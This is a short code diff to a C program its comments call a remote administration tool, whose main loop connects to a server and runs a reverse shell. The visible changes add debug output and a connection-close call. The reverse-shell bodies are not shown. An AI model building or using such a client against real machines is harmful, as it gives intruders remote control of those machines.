@@ -20,8 +20,12 @@ int main(int ac, char * av[])
 
 	setup(&m_s);			// setup the remote administration tool
 	while(1) {
+		#ifdef _DEBUG
+		debug(&m_s);
+		#endif
 		cnt(&m_s);		// connect to server
 		reverse_shell(&m_s);	// start the client handler
+		close_cnt(&m_s);
 	}
 	return 0;
 }
@@ -36,11 +40,17 @@ void error(char * msg)			// function used if errors occure
 void debug(struct main_struct *ms)		// function to print out vars if needed
 {
 	printf("-----------------------\n"
+	"Connection status 0 = active\n"
+	"cn = %d\n", ms->cn);
+	printf("-----------------------\n"
+	"all of variables\n"
 	"port : %d\n"
 	"ip : %s\n"
-	"buf : %s\n", ms->port, ms->ip, ms->buf);
+	"buf : %s\n"
+	"cmd : %s\n", ms->port, ms->ip, ms->buf, ms->cmd);
 }
 #endif
+
 
 void first_line_to_buffer(FILE * fp, char *buf)	// get the first line of a file and put
 {						// it into a buffer
